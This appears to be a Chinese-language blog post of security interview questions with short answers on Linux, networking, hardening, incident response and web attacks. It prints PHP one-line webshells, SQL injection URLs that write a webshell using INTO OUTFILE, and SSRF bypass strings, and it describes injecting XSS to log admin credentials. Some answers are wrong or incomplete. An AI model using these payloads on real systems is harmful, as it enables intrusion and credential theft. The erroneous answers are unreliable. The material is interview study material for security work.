---
layout:     post
title:      2020最新面试题
subtitle:   2020最新面试题
date:       2020-8-1
author:     xiwang
header-img: img/tag-bg-o.jpg
catalog: true
tags:
    - 2020最新面试题

---



## 面试重点复习方向

如果是去甲方客户那里 重点 防守方内容 例如 流量分析 应急响应 渗透测试的一些项目

如果是去乙方面试  重点复习漏洞原理 渗透思路等

如果你面试的薪资等级比较高, 把代码审计 和反序列化熟悉一下 

~~备注:作者总结的内容都是跟着自己的理解一字一字敲出来的,可能和正确答案稍微有所偏差~~ 

#                                                                           大基本功总结





## Windows

#### 1. 3389无法连接的几种情况

没有开放3389 端口被修改 有防护拦截 处于内网需要端口转发

#### 2.Windows常见的日志事件ID--[主要是Windows应急响应的一些工作会问到]

我记得一个 4624 表示登录成功的用户 ,4625是失败的, 47开头一些ID是用户和用户组增删改查的一些事件,太多的随用随时查了



## Windows AD域控

1.kerberos原理

大概意思就是说,一个密钥仅存在A和B之间 这个密钥是如何表示的,A向B提供这个密钥,B如何识别密钥的过程

最最通俗的理解就是如何证明你是你这样的

## Linux

#### 1常见web服务器容器

IIS Apache nginx Tomcat weblogic

#### 2如何手工快速判断目标站点是Windows还是linux

linux大小写敏感,windows大小写不敏感

#### 3系统运行级别那个是单用户模式

 单用户模式是 1

备注 0 关机 默认运行在3     6是重启

#### 4.如何查看 日志前100行

tail -n 100 /etc/passwd

###### 5.源码安装和rpm安装的区别

安装之前是概念上的区别 安装之后是位置上的区别 rpm依赖很难处理 安装之后不容易彻底删除

#### 6.文件底层如何加固

chattr 命令+i是全锁    备注: +a是修改锁 

可能最常问的就是 日志文件如何避免被修改删除常用于被入侵之后 

就说 chattr +a 属性 意思就是可以追加内容 ,不可以删除修改

#### 7.linux计划任务目录有哪些

/var/spool/cron/*
/var/spool/anacron/*
/etc/crontab
/etc/anacrontab
/etc/cron.*
/etc/anacrontab

面试可以说 /etc下面和var/spool 目录下面 就是 at crontab anacron 这三个

#### 8.dns在渗透中的作用

通过历史记录解析真实IP dns c2  子域名接管 dns欺骗  dns放大攻击

#### 9.如何判断当前网站使用了CDN

采用多地ping的方式 查看是不是同一个IP nslookup 查看  微步在线查看

#### 10.查看网络连接状态的命令有哪些 有什么区别

netstat ss 

ss比netstat 可以显示更详细的TCP连接信息 而且快速高效

#### 11.DNS的几个参数什么意思 

A 域名指向一个ipv4地址

CNAME 域名指向另外一个域名

AAAA域名指向一下ipv6地址

NS 子域名指定dns服务器

MX域名指向邮件服务器地址



#### 12.apache 和nginx有什么区别

nginx轻量级 nginx负载能力也比apache高一些 ,、Apache在处理动态有优势

#### 13.写过哪些sehll脚本

 linux基线检查的 mysql自动备份的 nginx启动的脚本 检测存活端口的

#### 14.iptables 有几个表几个链接 分别是什么 

raw 对数据包进行状态跟踪

mangle对数据包设置标记

nat修改包中的源

filter上

prerouting postrouting input forward output  五个链

#### 15.linux中如何禁止ping 文件是那个 什么参数

 **/etc/sysctl.conf** 中增加一行      **net.ipv4.icmp_echo_ignore_all=1**  1是禁止

#### 15.selinux是什么

为linux内核制作的安全模块

16.crontab可以帮助我们入侵检测吗？

可以，crontab的任务执行的日志记录在/var/log/cron中，想要知道系统中是否有木马可以查询一下这个日志记录。

## ELK

ElasticSearch 、 Logstash 和 Kiabana 三个

## docker

#### 1.什么是docker镜像

docker镜像是docker容器的源代码,docker镜像用于创建容器

#### 2.什么是docker容器

docker容器包括应用程序及其所有的依赖项,作为操作系统独立运行

#### 3.docker容器有几种状态

运行 已暂停 从新启动 已退出

#### 4.docker容器和镜像的区别

镜像是由一层层只读层堆在一起的,容器是镜像只读层+读写层

## TCP/IP网络

1. #### UDP TCP 特点和区别 

   TCP是面向连接 UDP无连接

   TCP可靠 UDP不可靠

2. #### TCP三次握手 

   第一次握手 客户端发送请求报文,将序列号和初始化序列号发送给服务端

   第二次握手 服务端收到之后,把自己的同步序列号 初始化序列号 确认序列号 和确认号发给客户端

   第三次握手 客户端发送同步序列号 数据号序列号 确认号 作为应答包发送

3. #### 交换机和路由器的区别是什么

   交换机用局域网内网的数据转发 ,路由器用于连接内网和外网

## 工具使用方面

#### sqlmap常用的参数 一共有几个级别 分别是什么



## http协议基础

1.cookie 和session的区别

2.localstorage和 sessionstorage

3.http的安全头有哪些



1. #### 


## 安全加固

#### linux系统方面(面试嘛 简单说10个就好,原则5个通用的,5个不常见的)

1.升级版本 关闭不用的服务和端口 修改配置项[比如账号密码的强度,过期时间],设置访问控制,最好是白名单

#### weblogic加固

(1)t3协议关闭
(2)关闭控制台或者删除控制台组件 
(3)自带目录全部删掉 自定义目录
(4)设置复杂密码要求 这个不用设置也可以
(5)设置监控流量跟踪设备 主要是针对0day漏洞

#### nginx apache tomcat IIS ftp等

最小化权限的原则 ,一些敏感目录设置白名单的访问方式,记录日志格式之类的

## 应急响应

linux操作系统应急响应

1.网站被上传了websehll 如何查杀



2.主机整了挖矿病毒 如何处理

#### 3.Windows被入侵后如何排查

检查账号[检查是否存在弱口令账号 高权限组是否存在越权账户 通过注册表查看影子账户]

检查可疑端口和进程,可以使用第三方工具 比如D盾 检查没有签名的进程

检查系统启动项 有没有可疑的 检查计划任务有没有可疑脚本 检查可疑文件  使用杀毒软件自动查杀

4.

3.企业员工被邮件钓鱼如何处理,如何溯源

4.Windows客户机被17010了 如何处理

5.常见webshell流量特征 



## 数据库基础

#### 一个mysql数据库的站点,只有一个80端口开放,什么原因

改了端口 站库分离 3306端口不对外开放

## 

## python

1. 

## javascript+html+css

1.常用重要的函数举例

alert() console.log() document.write() prompt() print() eval

2.js如何操作游览器 

使用f12看网页源代码，使用network查看发送的请求， 可以查看cookie本地存储信息,可以使用cookie对网站进行测试

## PHP

1. PHP常见一句话木马 手写

   ```php
   <?php eval($_PORT['cmd']);?>
   <?php system($_GET['cmd']);?>
   <?php assert($_POST['cmd']);?>
   <?php include'shell.txt'?>
   
   ```

2. PHP

## 协议分析

#### 1.常见webshell工具流量特征

蚁剑：无加密请求数据包，User-Agent: antSword/v2.1。蚁剑php类：@ini_set(“display_errors”,”0″);是明文比较好发现。ASP类：流量中进行URL其中的execute在蚁剑中被混淆，变成了拼接形式Ex”&cHr(101)&”cute。冰蝎：加密传输无法获取明文，发送GET请求，服务端会将密钥写入session中，发送给客户端。客户端获取密钥后会加密payload，使用加密的payload发送POST请求。基于GET请求包的检测特征：1.url包含.php?pass=；（密码如果被修改这个特征就会没用了），2.基于POST返回包的检测特征：Transfer-Encoding: chunked

2.wireshark 语法

## web安全

### XSS

1.有shell的情况下,如何使用XSS实现对目标网站的长久控制

 后台登录之处加入一段记录登录账号密码的js, 设置判断是否登陆成功,如果登陆成功,就把账号密码记录到一个生僻的路径的文件中,在登陆之后才可以访问的文件中插入XSS脚本

### SSRF

#### 1.SSRF原理

中文名字叫做客户端请求伪造,是由攻击者构造,服务端发起的漏洞,因为是服务端发起,就可以请求到和自己相连,但是和外网隔离的内部系统

#### 2.SSRF形成原因

服务端提供了从其他服务器获取数据的功能,但是没有对目标地址做过滤和限制

#### 3.SSRF常见触发点

web

 格式处理 

数据库

 广义ssrf[扫一扫 打开文档(宏) 客户端Markdown预览] 

XSPA

 图片加载[头像 以图搜图 插入图片 图片变化 Markdown显示图片] 

下载服务[百度云离线下载]

 预览服务[分享网站 收藏 网址预览] 

文件包含[开启了allow_url_fopen]

 多媒体加载[百度网盘 新浪网盘 56视频 网易直播]

 Api Demo[美丽说开发平台 搜狐webhook工具] 

站长工具[存货探测 监控 网站监测 获取源码] 

在线编程[危险函数] 

应用/中间件/自带实例文件[weblogic ] RSS[QQ邮箱RSS处]等

#### 4.SSRF常见触发点参数名

share wap url link src source target u 3g display sourceURL imageURL domain 等

##### 5.SSRF防御方法

输入合法性效验 返回结果效验 网络下肢 后缀限制 正则验证协议名 hostname限制 黑名单限制 域名解析 硬端口编码

#### 6.SSRF绕过思路

@绕过： www.baidu.com@127.0.0.1:7001
采用十进制及十六进制 访问 127.0.0.1：
http://2130706433  http://0x7F000001
302临时文件跳转，301永久文件跳转：跳转gopher
file：// 看文件  dict:// 端口扫描 命令执行
sftp：// ftp:// tftp:// 文件传输
ldap：// 轻量目录访问 gopher:// 都有
xip绕过：
http://10.0.0.1.xip.io = 10.0.0.1
封闭式字母数字绕过
句号绕过：
127。0。0。1 = 127.0.0.1
解析url方式不一致绕过:
http://127.0.0.1:11211:80
http://google.com#@evil.com

### 文件上传

#### 1.有webshell前提下,网站根目录下有.htaccess文件,可以做什么

写一条解析规则,将上传的png文件后缀的当成php代码执行

#### 2.审查上传点的元素有什么意义

有些站点的上传文件限制是前端限制,这样只需要增加,上传类型就可以突破限制了

#### 3.上传目标网站没有防护,上传图片可以正常访问,上传脚本格式访问403,是什么原因

原因较多,可能是web服务器配置把上传目录写死了不执行相应脚本,可以尝试修改文件后缀名绕过

### sql注入

#### 1.sql注入点。使用工具写入一句话，需要满足哪些条件

root权限和网站绝对路径还可以使用union查询

SQL写入一句话木马1. 判断长度?id=1’ order by 7--+

创建目录?id=1’ union select 1,2,3,4,5,6,7 into outfile ‘/etc/www/test.txt’ --+

写一句话木马进文件?id=1’ union select 1,2,3,4,5,6,’<?PHP  @eval($_post[“test”])? >’  into outfile ‘/etc/www/test.php’ --+

#### 2.突破字符转义的方法

宽字节绕过

hex编码绕过

#### 3.注入漏洞,只能查账号密码吗

这个主要权限够大,库的数据想怎么看怎么看

#### 4.注入时可以不使用 and or 或者 xor 直接 order by 可以开始注入吗

and/or/xor,  前面的1=1 1=2步骤是为了判断是否为注入点,如果已经确定是注入点,那就可以省略

#### 5.某个防注入系统,在注入时会提示:

系统检测到你有非法注入行为

已记录IP xx.xx.xx.xx

时间:2016:01-23

提交页面:test.asp?id=115

提交内容;and 1=1

##### 6.如何利用防注入系统拿shell

在URl里面直接提交一句话,这样网站会把一句话写入到数据库中,这样可以尝试寻找网站的配置文件 直接上菜刀连接

#### 7.SQL注入有以下两个测试选项,选择一个,并阐述不选择另外一个的理由

a. demo.jsp?id=2+1

b.demo.jsp?id=2-1

选择B 在url编码中 +号代表空格, 可能会造成混淆

#### 8,以下链接存在sql注入漏洞,对于这个变形注入,有什么思路

demo.do?DATA=AjAxNg==

DATA有可能是经过base64编码在传入服务器的,所以我们也要对参数进行base64编码才能正确的完成测试

#### 9.发现demo.jsp?uid=110 注入点,有那几种思路获取webshell,那种是优选

(1)有写入权限的话,构造联合查询语句 使用using into outfile  可以将查询的输出重定向到系统的文件中,

(2)使用sqlmap -os-shell 原理和上面的一种相同,来直接获得一个shell, 这样效率更高,

(3)通过构造联合查询语句,得到网站管理员的账户和密码 ,然后扫码登录后台 再在后台通过改包上传的形式 getshell

#### 10.sql注入 5.0以上和5.0以下有什么区别

5.0以下是单用户多操作的形式 5.0以上是多用户多操作 而且有infomation_schema这个表,5.0以下是没有的,只能暴力跑表名

11.圈出下面会话中可能存在的问题项,并标注可能会存在什么问题?



### 解析漏洞

#### 1.解析漏洞原理

解析后缀文件时,被解析成脚本

#### 2.常见解析漏洞

IIS6.0  举例 /xx.asp/xx.jpg  xx/asp是文件夹名字

IIS7.0和7.5 nginx <8.0.3默认Fast_CGI 开启状态,直接在url中图片地址后面输入/1.php 1.jpg会被当作PHP脚本来解析

nginx小于等于0.8.37  利用百分号00截断上传 xxx.jpg%00.php

原理:当URL中有不存在的文件，PHP就会向前递归解析。

 apache解析漏洞 原理 从右边往左判断的 如果不认识就会再往前判断

## 未授权访问

1.原理是什么

2.你有接触过那些未授权访问漏洞

3.实际上你有挖到过吗

## 提权

#### 1.提权选择可读写的目录,为何尽量不使用带空格的目录

exp执行执行,大部分都需要空格界定参数

## 逻辑漏洞

#### 1.目标站点禁止注册,找回密码出,输入用户名"此用户不存在"如何利用

爆破用户名,利用用户名爆破密码

#### 2.说出至少三种逻辑漏洞, 和修复方式

1.密码允许暴力破解 可以设置错误多少次就锁定的次数 

2.存在通用型找回凭证

3.可以跳过验证步骤

4.找回凭证可以拦包获取

4验证码可以通过改包的方法绕过等

## 文件包含

#### 1.站点发现某TXT的下载地址为

http://www.test.com/down/down.php?file=/upwdown/1.txt，你有什么思路？

看到file文件协议,在file=后面输入index.php 下载他的首页文件,在首页里面继续找其他网站的配置文件,可能会找出,网站数据库密码的地址

#### 2.

## WAF

#### 1.安全狗会追踪变量,发现是一句话木马吗

是根据的特征码匹配的,不会这么智能

## 爆破

#### 1.basic有那几种爆破方式

url 用户名和密码

使用burp +base64编码形式

## 内网渗透

#### 1.在Windows2003服务器中建立一个.zhongzi文件夹,用意何为

隐藏文件夹,为了不管理员发现上传上去的工具

2. 打入内网如何判断那台主机是域控



## 开放题

#### 1.拿到一个待检测的站，你觉得应该先做什么/给你一个网站，你会怎么渗透

信息收集

获取域名whois信息，注册人邮箱电话姓名等，放入社工库中搜寻有没有泄露的密码，在使用泄露的的密码进行登录，使用邮箱做关键词，在各大搜索引擎中搜索出相关的社交账号，尝试找出管理员设置密码的习惯，在利用收集到的信息生成专用字典，进行后台账号密码爆破

收集站点子域名，主站渗透不进去的话，尝试旁站入手了

收集站点服务器 操作系统 后端语言 中间件 搜索引擎查对应版本号的已知漏洞

查看真实IP 扫描端口 对存在端口进行探测，看一下是否有弱口令等

扫描站点目录结构，判断是否可以遍历目录，有敏感文件泄露等

漏洞扫描

对常见web漏洞进行测试，比如 SQL注入 XSS SSRF CSRF 代码执行 命令执行 越权访问 目录读取 任意文件读取，弱口令 暴力破解等

漏洞利用

利用web漏洞 进行getshell

提权

提升权限 例如 Windows MySQL udf提权 Linux 藏牛提权

日志清理

总结一下报告和修复方案

#### 2.判断网站CMS对渗透有什么意义

利用对应版本号 搜索已知漏洞

如果开源，下载源码进行审计

#### 3.成熟并相对安全的MCS扫描目录意义

查找敏感文件，二级目录扫描，是否有网站北方压缩文件等

#### 4.新闻后台编辑页面,看到编辑器,可以做什么

查看编辑器版本,利用搜索引擎搜索公开漏洞

#### 5.某服务器有站点A,B A后台添加test用户,访问B后台,也有test用户?

同一个数据库

#### 6.上传大马后,访问乱码,有哪些解决办法

游览器中改编码尝试

#### 7.后台修改管理员密码处,原密码显示为* 如何实现读出这用户的密码

审查元素,吧密码处的password 属性改成text就是明文显示了

#### 8.审查元素就可以知道所使用的防护软件,是这么做到的

F12查看HTMl体部 比如护卫神就可以在名称那看到内容 <hws>内容<hws>



#### 9.CSRF XSS XXE 区别修复方式

CSRF 跨站请求伪造 在页面中嵌入token ,输入密码的时候验证referer

XSS是跨站脚本  对实体字符转义 使用http only 禁止 js读取 cookie值输入效验 游览器和web端使用相同编码

XXE XML外部实体注入 禁止对外部实体的解析即可

#### 10.CSRF SSRF 重放攻击区别

CSRF 是跨站请求伪造

SSRF 服务端请求伪造

重放攻击 是将截获的数据包,进行重新发送, 

#### 11.linux常见的后门,以及Windows常见的后门(举例)

linux:

alias ssh 计划任务设置反弹shell 

Windows:

嗅探后门 放大镜后门 组策略后门

12.owasp top 10都有什么,

注入 构造不安全的命令发给解释器

失效的身份验证 弱口令 弱会话等

敏感数据泄露 指一些不想让用户看到的数据,被看到了,还有就是数据在传输过程中,没有加密

外部实体XXE 引用了外部实体 ,导致可以被攻击者,窃取内部文件,执行代码 ddos等

失效的访问控制 通过身份验证的用户,可以访问其他用户的相关信息

安全错误配置 操作者配置不当,造成攻击者可以利用这些配置,获取更高德权限

跨站脚本XSS 包含了不受信任,没有恰当验证的,js代码,攻击者可以,执行脚本,劫持用户会话等

不安全的反序列化 远程代码执行,重放攻击

使用已知漏洞的组件 利用已知的漏洞 进行窃取数据等

不足的日志记录和监控

#### 13.渗透测试的执行标准

前期交互 信息收集 威胁建模 漏洞分析 漏洞攻击 后渗透 报告

#### 14.那些地方可能发生信息泄露 ,怎么利用

(1)banner指纹信息,比如 操作系统 中间件 编程语言版本 目标网站的公司.招聘什么类型的开发人员

(2)测试页面,编辑器的备份文件,git文件信息 后台的管理地址

(3)github上面 看远吗 有没有数据库密码,邮箱账号密码之类的,还可以使用网络上搜索百度网盘的那种网站,看有没有可能有被员工上传过铭感文件

#### 15.ddos和CC攻击的区别

ddos是分布式拒绝服务攻击 ,发送大量请求,让目标网站挂掉

cc攻击是ddos的一种,全称的中文意思叫做挑战黑洞,不过他是利用代理服务器和肉鸡,这样都是正常的请求的,去访问目标网站的动态页面,动态页面就是需要和后端数据库做大量交互的地方,这样一直去消耗CPU的资源,造成拒绝服务 也就是说一个是针对web网络的,一个是针对web应用层面

#### 16.acces 扫描出asp的数据库文件 ,访问乱码 ,如何实现本地利用

 迅雷下载下来 改后缀是.mdb

#### 16.找一类你最擅长的漏洞,谈一下逃过漏洞修复后的方案

#### 17.你都通过那些渠道学习安全知识

#### 18.你有关注什么最新的漏洞吗

#### 19.常见的CVE编号你知道几个

